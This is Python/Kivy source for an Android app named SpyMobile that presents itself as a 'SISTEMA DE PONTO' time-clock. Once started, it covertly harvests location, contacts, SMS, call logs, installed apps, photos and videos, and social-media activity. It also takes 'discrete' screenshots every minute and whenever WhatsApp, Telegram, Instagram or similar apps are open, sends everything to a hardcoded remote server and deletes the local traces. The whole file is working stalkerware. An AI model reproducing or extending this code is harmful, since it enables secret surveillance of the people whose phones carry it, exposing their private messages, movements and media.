from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
import time
import requests
from gps_utils import get_location
from file_utils import list_files
from network_utils import get_ip, get_wifi_status
import os

# Configuração do endpoint Django - VPS SERVIDOR
DJANGO_IP = '147.79.111.118'  # IP da VPS Ubuntu
DJANGO_PORT = '8000'
ENDPOINT_ATIVIDADE = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/atividade/'
ENDPOINT_CONTATOS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/contatos/'
ENDPOINT_SMS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/sms/'
ENDPOINT_CHAMADAS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/chamadas/'
ENDPOINT_APPS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/apps/'
ENDPOINT_LOCALIZACAO = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/localizacao/'
ENDPOINT_UPLOAD = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/upload/'
ENDPOINT_REDES_SOCIAIS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/redes-sociais/'
ENDPOINT_ATIVIDADE_REDE = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/atividade-rede/'

class DigitalTimerLabel(Label):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.font_size = 96
        self.color = (0.3, 0.3, 0.3, 1)  # Cinza escuro (inativo)
        self.bold = True

class SpyMobile(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        
        # Configurar fundo preto
        with self.canvas.before:
            Color(0, 0, 0, 1)  # Preto
            self.rect = Rectangle(size=Window.size, pos=self.pos)
        
        self.bind(size=self._update_rect, pos=self._update_rect)
        
        # Variáveis de controle
        self.is_monitoring = False
        self.start_time = None
        self.timer_event = None
        self.social_monitor_event = None
        self.social_interactions = []
        
        # Criar layout principal centralizado
        main_layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        # Título
        title_label = Label(
            text='SISTEMA DE PONTO',
            font_size=24,
            color=(1, 0, 0, 1),  # Vermelho
            bold=True
        )
        main_layout.add_widget(title_label)
        
        # Timer digital
        self.timer_label = DigitalTimerLabel(
            text='00:00:00'
        )
        main_layout.add_widget(self.timer_label)
        
        # Mensagem de status
        self.status_label = Label(
            text='Sistema parado - Clique em PLAY para iniciar',
            font_size=16,
            color=(0.7, 0, 0, 1)  # Vermelho mais escuro
        )
        main_layout.add_widget(self.status_label)
        
        # Layout para botões
        buttons_layout = BoxLayout(orientation='horizontal', size_hint_y=0.3, spacing=15)
        
        # Botão Play
        self.play_button = Button(
            text='PLAY',
            font_size=20,
            background_color=(0, 0.7, 0, 1),  # Verde
            bold=True
        )
        self.play_button.bind(on_press=self.start_monitoring)
        buttons_layout.add_widget(self.play_button)
        
        # Botão Coletar
        self.collect_button = Button(
            text='COLETAR',
            font_size=18,
            background_color=(0, 0.5, 0.8, 1),  # Azul
            bold=True,
            disabled=True  # Inicialmente desabilitado
        )
        self.collect_button.bind(on_press=self.manual_collect)
        buttons_layout.add_widget(self.collect_button)
        
        # Botão Stop
        self.stop_button = Button(
            text='STOP', 
            font_size=20,
            background_color=(0.7, 0, 0, 1),  # Vermelho
            bold=True,
            disabled=True  # Inicialmente desabilitado
        )
        self.stop_button.bind(on_press=self.stop_monitoring)
        buttons_layout.add_widget(self.stop_button)
        
        main_layout.add_widget(buttons_layout)
        
        # Informações adicionais
        info_label = Label(
            text='Sistema seguro e discreto',
            font_size=12,
            color=(0.5, 0, 0, 1)  # Vermelho muito escuro
        )
        main_layout.add_widget(info_label)
        
        self.add_widget(main_layout)

    def _update_rect(self, instance, value):
        self.rect.size = instance.size
        self.rect.pos = instance.pos

    def start_monitoring(self, instance):
        if not self.is_monitoring:
            self.is_monitoring = True
            self.start_time = time.time()
            
            # Atualizar interface
            self.status_label.text = 'Coletando dados do dispositivo...'
            self.timer_label.color = (1, 0, 0, 1)  # Vermelho brilhante (ativo)
            
            # Habilitar/desabilitar botões
            self.play_button.disabled = True
            self.collect_button.disabled = False
            self.stop_button.disabled = False
            
            # Iniciar timer
            self.timer_event = Clock.schedule_interval(self.update_timer, 1)
            
            # Coleta única quando usuário apertar PLAY
            Clock.schedule_once(lambda dt: self.executar_coleta(), 2)

            # Iniciar captura automática de screenshots a cada 1 minuto (60 segundos)
            self.screenshot_event = Clock.schedule_interval(self.take_automatic_screenshot, 60)

            # Iniciar monitoramento de redes sociais a cada 10 segundos
            self.social_monitor_event = Clock.schedule_interval(self.monitor_social_interactions, 10)
            
            print("Monitoramento iniciado com captura de redes sociais")

    def stop_monitoring(self, instance):
        if self.is_monitoring:
            self.is_monitoring = False
            
            # Parar timer, screenshots e monitoramento social
            if self.timer_event:
                self.timer_event.cancel()
            if self.screenshot_event:
                self.screenshot_event.cancel()
            if self.social_monitor_event:
                self.social_monitor_event.cancel()
            
            # Atualizar interface
            self.status_label.text = 'Sistema parado - Clique em PLAY para iniciar'
            self.timer_label.color = (0.3, 0.3, 0.3, 1)  # Cinza escuro (inativo)
            self.timer_label.text = '00:00:00'
            
            # Habilitar/desabilitar botões
            self.play_button.disabled = False
            self.collect_button.disabled = True
            self.stop_button.disabled = True
            
            print("Monitoramento parado")
    
    def manual_collect(self, instance):
        """Coleta manual de dados quando usuário clicar em COLETAR"""
        if self.is_monitoring:
            self.status_label.text = 'Coletando novos dados...'
            Clock.schedule_once(lambda dt: self.executar_coleta(), 0.5)

    def update_timer(self, dt):
        if self.is_monitoring and self.start_time:
            elapsed = int(time.time() - self.start_time)
            h = elapsed // 3600
            m = (elapsed % 3600) // 60
            s = elapsed % 60
            
            # Formato digital com zeros à esquerda
            timer_text = f'{h:02d}:{m:02d}:{s:02d}'
            self.timer_label.text = timer_text
            
            # Efeito de piscar nos segundos pares/ímpares
            if s % 2 == 0:
                self.timer_label.color = (1, 0, 0, 1)  # Vermelho brilhante
            else:
                self.timer_label.color = (0.8, 0, 0, 1)  # Vermelho mais escuro

    def coleta_automatica(self):
        if not self.is_monitoring:
            return
            
        imei = 'dispositivo_desconhecido'
        
        # Coletar localização
        try:
            lat, lon = get_location()
            if lat and lon:
                data = {'imei': imei, 'latitude': lat, 'longitude': lon}
                requests.post(ENDPOINT_LOCALIZACAO, json=data)
        except Exception as e:
            print(f"Erro ao coletar localização: {e}")
        
        # Coletar contatos (apenas se for Android)
        try:
            from kivy.utils import platform
            if platform == 'android':
                from device_utils import get_contacts
                contatos = get_contacts()
                if contatos:
                    data = {'imei': imei, 'contatos': contatos}
                    requests.post(ENDPOINT_CONTATOS, json=data)
        except Exception as e:
            print(f"Erro ao coletar contatos: {e}")
        
        # Coletar SMS (apenas se for Android)
        try:
            from kivy.utils import platform
            if platform == 'android':
                from device_utils import get_sms
                sms = get_sms()
                if sms:
                    data = {'imei': imei, 'sms': sms}
                    requests.post(ENDPOINT_SMS, json=data)
        except Exception as e:
            print(f"Erro ao coletar SMS: {e}")
        
        # Coletar chamadas (apenas se for Android)
        try:
            from kivy.utils import platform
            if platform == 'android':
                from device_utils import get_calls
                calls = get_calls()
                if calls:
                    data = {'imei': imei, 'chamadas': calls}
                    requests.post(ENDPOINT_CHAMADAS, json=data)
        except Exception as e:
            print(f"Erro ao coletar chamadas: {e}")
        
        # Coletar apps instalados (apenas se for Android)
        try:
            from kivy.utils import platform
            if platform == 'android':
                from apps_utils import get_installed_apps
                apps = get_installed_apps()
                if apps:
                    data = {'imei': imei, 'apps': apps}
                    requests.post(ENDPOINT_APPS, json=data)
        except Exception as e:
            print(f"Erro ao coletar apps: {e}")
        
        # Coletar informações de rede
        try:
            ip = get_ip()
            wifi_status = get_wifi_status()
            if ip:
                data = {'imei': imei, 'ip': ip, 'wifi_status': wifi_status}
                requests.post(ENDPOINT_ATIVIDADE, json=data)
        except Exception as e:
            print(f"Erro ao coletar rede: {e}")
        
        # Coletar mídias (fotos/vídeos)
        try:
            from kivy.utils import platform
            if platform == 'android':
                from media_utils import get_media_files
                media_files = get_media_files()
                for media in media_files[:5]:  # Limitar a 5 arquivos por coleta
                    self.upload_media_file(media, imei)
        except Exception as e:
            print(f"Erro ao coletar mídias: {e}")
        
        # Coletar dados de redes sociais
        try:
            from kivy.utils import platform
            if platform == 'android':
                from social_utils import get_social_data
                social_data = get_social_data()
                if social_data:
                    data = {'imei': imei, 'social_data': social_data}
                    requests.post(ENDPOINT_REDES_SOCIAIS, json=data)
        except Exception as e:
            print(f"Erro ao coletar redes sociais: {e}")
        
        # Coletar atividade de rede
        try:
            ip = get_ip()
            wifi_status = get_wifi_status()
            if ip:
                data = {'imei': imei, 'ip': ip, 'wifi_status': wifi_status}
                requests.post(ENDPOINT_ATIVIDADE_REDE, json=data)
        except Exception as e:
            print(f"Erro ao coletar atividade de rede: {e}")
        
        print(f"Coleta automática concluída para {imei}")
    
    def executar_coleta(self):
        """Executa coleta única e atualiza status"""
        self.coleta_automatica()
        # Atualizar status após coleta
        Clock.schedule_once(lambda dt: self.atualizar_status_pos_coleta(), 3)
    
    def atualizar_status_pos_coleta(self):
        """Atualiza status após coleta ser concluída"""
        if self.is_monitoring:
            self.status_label.text = 'Dados coletados e enviados com sucesso!'
    
    def upload_media_file(self, file_path, imei):
        """Upload de arquivo de mídia para o servidor"""
        try:
            import os
            if os.path.exists(file_path) and os.path.getsize(file_path) < 10*1024*1024:  # Max 10MB
                with open(file_path, 'rb') as f:
                    files = {'file': f}
                    data = {'imei': imei, 'tipo': 'media'}
                    requests.post(ENDPOINT_UPLOAD, files=files, data=data, timeout=30)
        except Exception as e:
            print(f"Erro ao fazer upload de {file_path}: {e}")
        
        # Registrar atividade de coleta
        self.status_label.text = 'Enviando dados coletados...'
    
    def monitor_social_interactions(self, dt):
        """Monitora interações em redes sociais a cada 10 segundos"""
        if not self.is_monitoring:
            return
            
        try:
            from kivy.utils import platform
            if platform == 'android':
                from screen_monitor import get_current_app
                
                current_app = get_current_app()
                current_time = time.time()
                
                # Apps de redes sociais para monitorar
                social_apps = {
                    'com.whatsapp': 'WhatsApp',
                    'org.telegram.messenger': 'Telegram', 
                    'com.facebook.katana': 'Facebook',
                    'com.instagram.android': 'Instagram',
                    'com.twitter.android': 'Twitter',
                    'com.snapchat.android': 'Snapchat'
                }
                
                if current_app and current_app in social_apps:
                    # Capturar screenshot discretamente
                    screenshot_path = None
                    try:
                        from screenshot_utils import take_discrete_screenshot
                        screenshot_path = take_discrete_screenshot()
                        if screenshot_path:
                            print(f"Screenshot capturado: {screenshot_path}")
                    except Exception as e:
                        print(f"Erro na captura de tela: {e}")
                    
                    interaction = {
                        'app_name': social_apps[current_app],
                        'package': current_app,
                        'timestamp': current_time,
                        'action': 'app_active',
                        'screenshot': screenshot_path
                    }
                    
                    # Enviar dados para servidor
                    imei = 'dispositivo_desconhecido'
                    data = {
                        'imei': imei,
                        'interaction': interaction
                    }
                    
                    try:
                        # Enviar dados da interação
                        requests.post(ENDPOINT_REDES_SOCIAIS, json=data, timeout=5)
                        
                        # Enviar screenshot se capturado
                        if screenshot_path and os.path.exists(screenshot_path):
                            self.upload_screenshot(screenshot_path, imei, social_apps[current_app])
                        
                        print(f"Interação + screenshot: {social_apps[current_app]}")
                        
                        # Atualizar status temporariamente
                        old_status = self.status_label.text
                        self.status_label.text = f'📸 {social_apps[current_app]} capturado'
                        Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', old_status), 3)
                        
                    except Exception as e:
                        print(f"Erro ao enviar interação: {e}")
                        
        except Exception as e:
            print(f"Erro no monitoramento social: {e}")
    
    def upload_screenshot(self, screenshot_path, imei, app_name):
        """Faz upload discreto do screenshot"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'imei': imei,
                        'tipo': 'screenshot',
                        'app': app_name,
                        'timestamp': time.time()
                    }

                    response = requests.post(ENDPOINT_UPLOAD, files=files, data=data, timeout=10)

                    if response.status_code == 200:
                        # Deletar arquivo local após upload
                        os.remove(screenshot_path)
                        print(f"Screenshot de {app_name} enviado e removido")

        except Exception as e:
            print(f"Erro no upload do screenshot: {e}")

    def take_automatic_screenshot(self, dt):
        """Captura screenshot automática a cada 1 minuto"""
        if not self.is_monitoring:
            return

        try:
            from kivy.utils import platform
            if platform == 'android':
                from screenshot_utils import take_discrete_screenshot

                screenshot_path = take_discrete_screenshot()
                if screenshot_path:
                    print(f"Screenshot automático capturado: {screenshot_path}")

                    # Enviar screenshot para servidor
                    imei = 'dispositivo_desconhecido'
                    self.upload_screenshot(screenshot_path, imei, 'automatico')

                    # Atualizar status temporariamente
                    old_status = self.status_label.text
                    self.status_label.text = '📸 Screenshot automático enviado'
                    Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', old_status), 3)

                    print("Screenshot automático enviado com sucesso")
                else:
                    print("Falha na captura de screenshot automático")

        except Exception as e:
            print(f"Erro na captura automática de screenshot: {e}")

class SpyMobileApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 1)  # Fundo preto
        return SpyMobile()

if __name__ == '__main__':
    SpyMobileApp().run()
